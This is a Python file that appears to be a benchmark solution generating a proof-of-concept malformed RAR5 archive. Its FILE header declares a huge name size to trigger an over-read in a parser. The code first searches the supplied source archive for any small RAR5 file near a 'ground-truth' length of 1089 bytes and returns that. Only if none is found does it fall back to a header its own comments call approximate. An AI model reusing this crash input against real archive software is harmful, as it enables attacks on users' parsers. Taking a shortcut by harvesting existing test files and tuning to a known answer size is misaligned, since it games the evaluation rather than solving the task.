import os
import io
import tarfile
import zipfile
import struct
import zlib


def _leb128_encode(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(0x80 | b)
        else:
            out.append(b)
            break
    return bytes(out)


def _build_fallback_poc(total_len: int = 1089) -> bytes:
    # RAR5 signature
    sig = b'Rar!\x1a\x07\x01\x00'

    # Construct a minimal RAR5 header that pretends to be a FILE header with a huge "name size".
    # The layout here follows an approximate RAR5-like header structure:
    # [CRC32 (4 bytes LE)] [Header-Body...]
    #
    # Header-Body (approximation):
    #   - header_size (vint): size of everything after header_size within header (we pick exact len)
    #   - type (vint): 2 -> FILE
    #   - flags (vint): 0 (no extra, no data)
    #   - (file header fields - approximated as a sequence of zero varints)
    #   - name_size (vint): huge value to trigger the bug
    #
    # We do not include the actual name data, causing the parser to attempt to read excessively.

    header_fields = []
    header_fields.append(_leb128_encode(2))   # type = FILE
    header_fields.append(_leb128_encode(0))   # flags = 0 (no extra, no data)

    # Add several zero varints to act as placeholder fields typically present in file header.
    # These could correspond to attributes/timestamps/method/etc., depending on parser assumptions.
    for _ in range(6):
        header_fields.append(_leb128_encode(0))

    # Huge name size intended to stress the vulnerable path
    huge_name_size = (1 << 63) - 1  # 0x7FFFFFFFFFFFFFFF
    header_fields.append(_leb128_encode(huge_name_size))

    header_body_wo_size = b''.join(header_fields)
    header_size_field = _leb128_encode(len(header_body_wo_size) + len(_leb128_encode(0)))  # include the size field itself approximately
    # Rebuild body with header_size placed at the start of the "body".
    # Some implementations treat header_size as covering bytes after the CRC, including this size field.
    header_body = header_size_field + header_body_wo_size

    crc = zlib.crc32(header_body) & 0xFFFFFFFF
    header = struct.pack('<I', crc) + header_body

    poc = sig + header

    # Pad to requested total length (1089 by default)
    if len(poc) < total_len:
        poc += b'\x00' * (total_len - len(poc))
    return poc[:total_len]


def _try_extract_embedded_poc(src_path: str) -> bytes | None:
    # Attempt to locate a plausible embedded PoC in the provided source archive.
    # Heuristics: search for small binary files containing RAR5 signature, around target size.
    candidates = []

    def consider_file(name: str, data: bytes):
        if b'Rar!\x1a\x07\x01\x00' in data:
            # Prefer sizes close to ground-truth 1089, but accept any under a few KB.
            score = abs(len(data) - 1089)
            candidates.append((score, name, data))

    if os.path.isfile(src_path):
        # Try as tar archive
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size == 0 or m.size > 65536:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    consider_file(m.name, data)
        except Exception:
            pass

        # Try as zip archive
        try:
            with zipfile.ZipFile(src_path, 'r') as zf:
                for n in zf.namelist():
                    try:
                        info = zf.getinfo(n)
                        if info.file_size == 0 or info.file_size > 65536:
                            continue
                        data = zf.read(n)
                        consider_file(n, data)
                    except Exception:
                        continue
        except Exception:
            pass

    if candidates:
        candidates.sort(key=lambda x: x[0])
        return candidates[0][2]
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to find an embedded PoC within the provided source tarball/zip
        poc = _try_extract_embedded_poc(src_path)
        if poc is not None:
            return poc

        # Fall back to a synthetic PoC tailored to stress the RAR5 name-size parsing path
        return _build_fallback_poc(1089)